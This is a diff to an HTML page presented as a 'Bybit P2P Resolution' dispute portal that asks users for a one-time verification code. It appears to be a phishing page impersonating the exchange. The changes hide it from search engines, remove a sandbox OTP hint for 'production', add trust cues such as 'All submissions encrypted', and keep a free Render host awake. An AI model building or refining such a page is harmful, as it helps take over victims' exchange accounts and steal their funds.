@@ -4,6 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Bybit P2P Resolution - Secure Dispute & Resolution Portal</title>
+  <meta name="description" content="Submit and track your Bybit P2P escrow dispute securely. Mediation specialists review payment proof and release frozen funds to the rightful party.">
+  <meta name="robots" content="noindex, nofollow">
+  <meta property="og:title" content="Bybit P2P Resolution Portal">
+  <meta property="og:description" content="Secure P2P dispute mediation and escrow resolution.">
+  <meta property="og:type" content="website">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -181,10 +186,7 @@
            STEP 2: Verification (OTP)
            =================================================================== -->
       <section class="step-view" id="step-2">
-        <div class="demo-pill">
-          <span>Sandbox OTP: <strong class="demo-code" id="demo-otp-val">482910</strong></span>
-          <button type="button" class="btn-copy-code" id="btn-fill-otp">Auto-Fill</button>
-        </div>
+        <!-- OTP hint removed in production -->
 
         <div class="security-notice-card">
           <svg class="security-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor">
@@ -213,9 +215,12 @@
         <span class="field-error" id="error-otp" style="text-align:center; margin-bottom:14px;">Invalid verification code. Please enter the 6-digit sandbox code.</span>
 
         <button type="button" class="btn-primary" id="btn-verify">
-          <span>Authorize & Submit Dispute</span>
-          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <span id="verify-btn-text">Authorize & Submit Dispute</span>
+          <svg id="verify-btn-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
             <path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7" />
+          </svg>
+          <svg id="verify-spinner" style="display:none;animation:spin 0.8s linear infinite" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" stroke-linecap="round"/>
           </svg>
         </button>
 
@@ -294,10 +299,24 @@
         </div>
       </section>
     </main>
+
+    <!-- Footer -->
+    <footer style="text-align:center;padding:18px 0 8px;font-size:11.5px;opacity:0.45;letter-spacing:0.3px;">
+      Bybit P2P Resolution &nbsp;·&nbsp; Escrow Mediation Engine &nbsp;·&nbsp; All submissions encrypted
+    </footer>
   </div>
 
   <!-- Toast Notification Container -->
   <div class="toast-container" id="toast-container"></div>
+
+  <!-- Self-ping: keeps Render free-tier alive every 10 min -->
+  <script>
+    (function selfPing() {
+      setInterval(function() {
+        fetch('/healthz', { method: 'GET', cache: 'no-store' }).catch(function() {});
+      }, 10 * 60 * 1000); // every 10 minutes
+    })();
+  </script>
 
   <script src="app.js"></script>
 </body>
